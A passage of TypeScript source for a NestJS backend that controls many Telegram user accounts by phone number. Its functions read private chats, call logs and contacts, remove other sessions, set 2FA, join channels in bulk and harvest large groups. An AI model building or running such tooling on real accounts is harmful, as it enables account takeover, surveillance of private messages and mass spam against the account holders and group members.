}\n\n    @Get('chat/statistics/:mobile')\n    @ApiOperation({ summary: 'Get chat statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    @ApiQuery({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false })\n    async getChatStatistics(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('period') period: 'day' | 'week' | 'month' = 'week'\n    ): Promise<ChatStatistics> {\n        return this.telegramService.getChatStatistics(mobile, chatId, period);\n    }\n\n    // Message Scheduling\n    @Post('messages/schedule/:mobile')\n    @ApiOperation({ summary: 'Schedule a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ScheduleMessageDto })\n    async scheduleMessage(\n        @Param('mobile') mobile: string,\n        @Body() schedule: ScheduleMessageDto\n    ) {\n        return this.telegramService.scheduleMessage(mobile, {\n            chatId: schedule.chatId,\n            message: schedule.message,\n            scheduledTime: new Date(schedule.scheduledTime),\n            replyTo: schedule.replyTo,\n            silent: schedule.silent\n        });\n    }\n\n    @Get('messages/scheduled/:mobile')\n    @ApiOperation({ summary: 'Get scheduled messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    async getScheduledMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.telegramService.getScheduledMessages(mobile, chatId);\n    }\n\n    // Enhanced Media Operations\n    @Post('media/voice/:mobile')\n    @ApiOperation({ summary: 'Send voice message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendVoiceMessage(\n        @Param('mobile') mobile: string,\n        @Body() voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        return this.telegramService.sendVoiceMessage(mobile, voice);\n    }\n\n    @Post('media/view-once/:mobile')\n    @ApiOperation({ summary: 'Send a view once (disappearing) media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiConsumes('multipart/form-data', 'application/json')\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                chatId: { type: 'string', description: 'Chat ID to send the media to' },\n                sourceType: { type: 'string', enum: ['path', 'base64', 'binary'], description: 'Source type of media' },\n                path: { type: 'string', description: 'path of the media file (when sourceType is Path)' },\n                base64Data: { type: 'string', description: 'Base64 data (when sourceType is base64)' },\n                binaryData: { type: 'string', format: 'binary', description: 'Binary file (when sourceType is binary)' },\n                caption: { type: 'string', description: 'Optional caption for the media' },\n                filename: { type: 'string', description: 'Optional filename for the media' }\n            },\n            required: ['chatId', 'sourceType']\n        }\n    })\n    @UseInterceptors(FileInterceptor('binaryData', {\n        storage: multer.memoryStorage()\n    }))\n    @ApiResponse({ status: 200, description: 'View once media sent successfully' })\n    @ApiResponse({ status: 400, description: 'Failed to send view once media' })\n    async sendViewOnceMedia(\n        @Param('mobile') mobile: string,\n        @UploadedFile() file: Express.Multer.File,\n        @Body() viewOnceDto: ViewOnceMediaDto\n    ) {\n\n        // Handle file upload case\n        if (viewOnceDto.sourceType === MediaSourceType.BINARY && file) {\n            return this.telegramService.sendViewOnceMedia(mobile, {\n                chatId: viewOnceDto.chatId,\n                sourceType: viewOnceDto.sourceType,\n                binaryData: file.buffer,\n                caption: viewOnceDto.caption,\n                filename: viewOnceDto.filename || file.originalname\n            });\n        }\n\n        // Handle JSON payload case (URL or base64)\n        return this.telegramService.sendViewOnceMedia(mobile, {\n            chatId: viewOnceDto.chatId,\n            sourceType: viewOnceDto.sourceType,\n            path: viewOnceDto.path,\n            base64Data: viewOnceDto.base64Data,\n            caption: viewOnceDto.caption,\n            filename: viewOnceDto.filename\n        });\n    }\n\n    // Advanced Chat Operations\n    @Get('chat/history/:mobile')\n    @ApiOperation({ summary: 'Get chat history with metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getChatHistory(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('offset') offset?: number,\n        @Query('limit') limit?: number\n    ) {\n        return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\n    }\n\n    @Post('group/admin/promote/:mobile')\n    @ApiOperation({ summary: 'Promote members to admin' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async promoteToAdmin(\n        @Param('mobile') mobile: string,\n        @Body() adminOp: AdminOperationDto\n    ) {\n        return this.telegramService.promoteToAdmin(\n            mobile,\n            adminOp.groupId,\n            adminOp.userId,\n            adminOp.permissions,\n            adminOp.rank\n        );\n    }\n\n    @Post('group/admin/demote/:mobile')\n    @ApiOperation({ summary: 'Demote admin to regular member' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async demoteAdmin(\n        @Param('mobile') mobile: string,\n        @Body() memberOp: GroupMemberOperationDto\n    ) {\n        return this.telegramService.demoteAdmin(\n            mobile,\n            memberOp.groupId,\n            memberOp.members[0]\n        );\n    }\n\n    @Post('group/unblock/:mobile')\n    @ApiOperation({ summary: 'Unblock a user in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async unblockGroupUser(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            groupId: string;\n            userId: string;\n        }\n    ) {\n        return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);\n    }\n\n    @Get('group/admins/:mobile')\n    @ApiOperation({ summary: 'Get list of group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupAdmins(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGroupAdmins(mobile, groupId);\n    }\n\n    @Get('group/banned/:mobile')\n    @ApiOperation({ summary: 'Get list of banned users in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupBannedUsers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGroupBannedUsers(mobile, groupId);\n    }\n\n    // Advanced Contact Management\n    @Post('contacts/export/:mobile')\n    @ApiOperation({ summary: 'Export contacts in vCard or CSV format' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactExportImportDto })\n    async exportContacts(\n        @Param('mobile') mobile: string,\n        @Body() exportDto: ContactExportImportDto,\n        @Res() res: Response\n    ) {\n        const data = await this.telegramService.exportContacts(\n            mobile,\n            exportDto.format,\n            exportDto.includeBlocked\n        );\n\n        const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;\n        res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');\n        res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n        res.send(data);\n    }\n\n    @Post('contacts/import/:mobile')\n    @ApiOperation({ summary: 'Import contacts from a list' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async importContacts(\n        @Param('mobile') mobile: string,\n        @Body() contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        return this.telegramService.importContacts(mobile, contacts);\n    }\n\n    @Post('contacts/block/:mobile')\n    @ApiOperation({ summary: 'Manage blocked contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactBlockListDto })\n    async manageBlockList(\n        @Param('mobile') mobile: string,\n        @Body() blockList: ContactBlockListDto\n    ) {\n        return this.telegramService.manageBlockList(\n            mobile,\n            blockList.userIds,\n            blockList.block\n        );\n    }\n\n    @Get('contacts/statistics/:mobile')\n    @ApiOperation({ summary: 'Get contact activity statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contact statistics retrieved successfully' })\n    async getContactStatistics(@Param('mobile') mobile: string) {\n        return this.telegramService.getContactStatistics(mobile);\n    }\n\n    // Chat Folder Management\n    @Post('folders/create/:mobile')\n    @ApiOperation({ summary: 'Create a new chat folder' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateChatFolderDto })\n    async createChatFolder(\n        @Param('mobile') mobile: string,\n        @Body() folder: CreateChatFolderDto\n    ) {\n        return this.telegramService.createChatFolder(mobile, folder);\n    }\n\n    @Get('folders/:mobile')\n    @ApiOperation({ summary: 'Get all chat folders' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChatFolders(@Param('mobile') mobile: string) {\n        return this.telegramService.getChatFolders(mobile);\n    }\n\n    @Put('messages/:mobile')\n    @ApiOperation({ summary: 'Edit message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async editMessage(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        return this.telegramService.editMessage(mobile, options);\n    }\n\n    @Post('chat/settings/:mobile')\n    @ApiOperation({ summary: 'Update chat settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updateChatSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: {\n            chatId: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n            username?: string;\n        }\n    ) {\n        return this.telegramService.updateChatSettings(mobile, settings);\n    }\n\n    @Post('media/batch/:mobile')\n    @ApiOperation({ summary: 'Send multiple media files in batch' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendMediaBatch(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        return this.telegramService.sendMediaBatch(mobile, options);\n    }\n\n    @Get('security/2fa-status/:mobile')\n    @ApiOperation({ summary: 'Check if 2FA password is set' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async hasPassword(@Param('mobile') mobile: string) {\n        return this.telegramService.hasPassword(mobile);\n    }\n\n    @Get('chats/:mobile')\n    @ApiOperation({ summary: 'Get chats with advanced filtering' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChats(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number,\n        @Query('offsetDate') offsetDate?: number,\n        @Query('offsetId') offsetId?: number,\n        @Query('offsetPeer') offsetPeer?: string,\n        @Query('folderId') folderId?: number\n    ) {\n        return this.telegramService.getChats(mobile, {\n            limit,\n            offsetDate,\n            offsetId,\n            offsetPeer,\n            folderId\n        });\n    }\n\n    @Get('file/url/:mobile')\n    @ApiOperation({ summary: 'Get downloadable URL for a file' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getFileUrl(\n        @Param('mobile') mobile: string,\n        @Query('url') url: string,\n        @Query('filename') filename: string\n    ): Promise<string> {\n        return this.telegramService.getFileUrl(mobile, url, filename);\n    }\n\n    @Get('messages/stats/:mobile')\n    @ApiOperation({ summary: 'Get message statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getMessageStats(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        return this.telegramService.getMessageStats(mobile, options);\n    }\n\n    @Get('chats/top-private/:mobile')\n    @ApiOperation({ summary: 'Get top 5 private chats with detailed statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getTopPrivateChats(@Param('mobile') mobile: string) {\n        return this.telegramService.getTopPrivateChats(mobile);\n    }\n\n    @Post('bots/add-to-channel/:mobile')\n    @ApiOperation({ summary: 'Add bots to channel with admin privileges' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                channelIds: {\n                    type: 'array',\n                    items: {\n                        type: 'string'\n                    },\n                    description: 'Array of channel IDs to add bots to. If not provided, will use default channels from environment variables.'\n                }\n            }\n        }\n    })\n    @ApiResponse({ status: 200, description: 'Bots added to channels successfully' })\n    async addBotsToChannel(\n        @Param('mobile') mobile: string,\n        @Body() body: { channelIds?: string[] }\n    ) {\n        return this.telegramService.addBotsToChannel(mobile, body.channelIds);\n    }\n\n    //Create bot endpoints\n    @Post('bot/create/:mobile')\n    @ApiOperation({ summary: 'Create a new bot using BotFather' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateBotDto })\n    @ApiResponse({\n        status: 201,\n        description: 'Bot created successfully',\n        schema: {\n            type: 'object',\n            properties: {\n                botToken: { type: 'string', description: 'The token to access HTTP Bot API' },\n                username: { type: 'string', description: 'The username of the created bot' }\n            }\n        }\n    })\n    @ApiResponse({ status: 400, description: 'Bad Request - Invalid bot details' })\n    @ApiResponse({ status: 401, description: 'Unauthorized - Client not connected' })\n    async createBot(\n        @Param('mobile') mobile: string,\n        @Body() createBotDto: CreateBotDto\n    ) {\n        return this.telegramService.createBot(mobile, createBotDto);\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { TelegramService } from './Telegram.service';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { TelegramValidationConfig } from './config/telegram-validation.config';\nimport { InitModule } from '../ConfigurationInit';\n\n@Module({\n    imports: [\n        InitModule,\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)\n    ],\n    controllers: [TelegramController],\n    providers: [\n        TelegramService,\n        TelegramValidationConfig,\n        {\n            provide: 'TELEGRAM_LOGGER',\n            useValue: TelegramLogger.getInstance()\n        }\n    ],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { UsersService } from '../users/users.service';\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\nimport { parseError } from '../../utils/parseError';\nimport { ChannelInfo } from './types/telegram-responses';\nimport { connectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { DialogsQueryDto } from './dto/metadata-operations.dto';\nimport { ChatStatistics, ContentFilter, GroupOptions, MessageScheduleOptions } from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport * as fs from 'fs';\nimport { sleep } from 'telegram/Helpers';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { SearchMessagesDto } from './dto/message-search.dto';\nimport { CreateBotDto } from './dto/create-bot.dto';\nimport { Api } from 'telegram';\nimport { shouldMatch } from '../../utils';\nimport { ConnectionStatsDto, ConnectionStatusDto, GetClientOptionsDto } from './dto/connection-management.dto';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private readonly logger: TelegramLogger;\n    private cleanupInterval: NodeJS.Timer;\n\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {\n        this.logger = TelegramLogger.getInstance();\n        this.cleanupInterval = connectionManager.startCleanupInterval();\n        connectionManager.setUsersService(this.usersService);\n    }\n\n    async onModuleDestroy() {\n        this.logger.logOperation('system', 'Module destroy initiated');\n        clearInterval(this.cleanupInterval as NodeJS.Timeout);\n    }\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     console.log(\"updated ActiveChannels\");\n                // } catch (error) {\n                //     console.log(parseError(error));\n                //     console.log(\"Failed to update ActiveChannels\");\n                // }\n            } else {\n                await this.channelsService.remove(chatEntity.channelId);\n                await this.activeChannelsService.remove(chatEntity.channelId);\n                console.log(\"Removed Channel- \", chatEntity.username);\n            }\n        } catch (error) {\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            try {\n                if (channelId) {\n                    await this.channelsService.remove(channelId)\n                    await this.activeChannelsService.remove(channelId);\n                    console.log(\"Removed Channel- \", channelId);\n                } else {\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\n                    await this.channelsService.remove(channelDetails.channelId)\n                    await this.activeChannelsService.remove(channelDetails.channelId);\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\n                }\n            } catch (searchError) {\n                console.log(\"Failed to search/remove channel: \", searchError);\n            }\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async getSelfMsgsInfo(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getSelfMSgsInfo();\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardMedia(mobile: string, channel: string, fromChatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.forwardMedia(channel, fromChatId);\n        setTimeout(async () => {\n            try {\n                await this.leaveChannel(mobile, \"2302868706\");\n            } catch (error) {\n                console.log(\"Error in forwardMedia: \", error);\n            }\n        }, 5 * 60000);\n        return \"Media forward initiated\";\n    }\n\n    async forwardMediaToBot(mobile: string, fromChatId: string): Promise<string> {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            await telegramClient.forwardMediaToBot(fromChatId);\n            const dialogs = await telegramClient.getDialogs({ limit: 500 });\n            const channels = dialogs\n                .filter(chat => chat.isChannel || chat.isGroup)\n                .map(chat => {\n                    const chatEntity = chat.entity as Api.Channel;\n                    const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;\n\n                    if (!chatEntity.broadcast &&\n                        !cannotSendMsgs &&\n                        chatEntity.participantsCount > 50 &&\n                        shouldMatch(chatEntity)) {\n\n                        return {\n                            channelId: chatEntity.id.toString(),\n                            canSendMsgs: true,\n                            participantsCount: chatEntity.participantsCount,\n                            private: false,\n                            title: chatEntity.title,\n                            broadcast: chatEntity.broadcast,\n                            megagroup: chatEntity.megagroup,\n                            restricted: chatEntity.restricted,\n                            sendMessages: true,\n                            username: chatEntity.username,\n                            forbidden: false\n                        };\n                    }\n                    return null;\n                })\n                .filter((channel): channel is NonNullable<typeof channel> => Boolean(channel));\n\n            await connectionManager.unregisterClient(mobile);\n            await this.channelsService.createMultiple(channels);\n            await this.activeChannelsService.createMultiple(channels);\n            return \"Media forward initiated successfully\";\n        } catch (error) {\n            console.error(\"Error forwarding media:\", error);\n            return `Media forward failed: ${error.message}`;\n        }\n    }\n\n    async blockUser(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.blockUser(chatId);\n    }\n\n\n    async joinChannel(mobile: string, channelId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.joinChannel(channelId);\n    }\n\n    async getCallLog(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getCallLog();\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false): Promise<ChannelInfo> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.channelInfo(sendIds);\n    }\n\n    async getMe(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMe();\n    }\n\n    async getEntity(mobile: string, entity: EntityLike) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getEntity(entity); // Assuming 'getEntity()' is a valid method\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            console.log(\"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        } finally {\n            await connectionManager.unregisterClient(mobile);\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async getMediaMetadata(mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n            all?: boolean;\n        }) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        if (params) {\n            return await telegramClient.getAllMediaMetaData(params);\n        } else {\n            return await telegramClient.getMediaMetadata(params);\n        }\n    }\n\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\n    }\n\n    async forwardMessage(mobile: string, toChatId: string, fromChatId: string, messageId: number) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        const channelinfo = await telegramClient.channelInfo(false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        telegramClient.leaveChannels(leaveChannelIds);\n        return \"Left channels initiated\";\n    }\n\n    async leaveChannel(mobile: string, channel: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.leaveChannels([channel]);\n        return \"Left channel initiated\";\n    }\n\n    async deleteChat(mobile: string, params: {\n        peer: string | Api.TypeInputPeer;\n        maxId?: number;\n        justClear?: boolean;\n        revoke?: boolean;\n        minDate?: number;\n        maxDate?: number;\n    }) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.deleteChat(params);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName: string,\n        about?: string,\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.updateProfile(firstName, about);\n    }\n\n    async getDialogs(mobile: string, query: DialogsQueryDto) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const { limit = 10, offsetId, archived = false } = query;\n        const dialogs = await telegramClient.getDialogs({ limit, offsetId, archived });\n        const chatData = [];\n        for (const chat of dialogs) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n\n    async getConnectionStatus(): Promise<{\n        activeConnections: number;\n        rateLimited: number;\n        totalOperations: number;\n    }> {\n        const status = {\n            activeConnections: connectionManager.getActiveConnectionCount(),\n            rateLimited: 0,\n            totalOperations: 0\n        };\n\n        this.logger.logOperation('system', 'Connection status retrieved', status);\n        return status;\n    }\n\n    async forwardBulkMessages(\n        mobile: string,\n        fromChatId: string,\n        toChatId: string,\n        messageIds: number[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessages(fromChatId, toChatId, messageIds)\n    }\n\n    async getAuths(mobile: string): Promise<any[]> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const auths = await telegramClient.getAuths();\n        this.logger.logOperation(mobile, 'Retrieved authorizations', {\n            count: auths?.length || 0\n        });\n        return auths;\n    }\n\n    async removeOtherAuths(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.removeOtherAuths();\n        this.logger.logOperation(mobile, 'Removed other authorizations');\n        return \"Removed other authorizations\";\n    }\n\n    public async processBatch<T>(\n        items: T[],\n        batchSize: number,\n        processor: (batch: T[]) => Promise<void>,\n        delayMs: number = 2000\n    ): Promise<{ processed: number, errors: Error[] }> {\n        const errors: Error[] = [];\n        let processed = 0;\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            try {\n                await processor(batch);\n                processed += batch.length;\n                if (i + batchSize < items.length) {\n                    await new Promise(resolve => setTimeout(resolve, delayMs));\n                }\n            } catch (error) {\n                errors.push(error);\n                this.logger.logError('batch-process', 'Batch processing failed', error);\n            }\n        }\n\n        return { processed, errors };\n    }\n\n    // Enhanced Group Management\n    async createGroupWithOptions(mobile: string, options: GroupOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const result = await telegramClient.createGroupOrChannel(options);\n        // Attempt to extract the channel/group ID from the 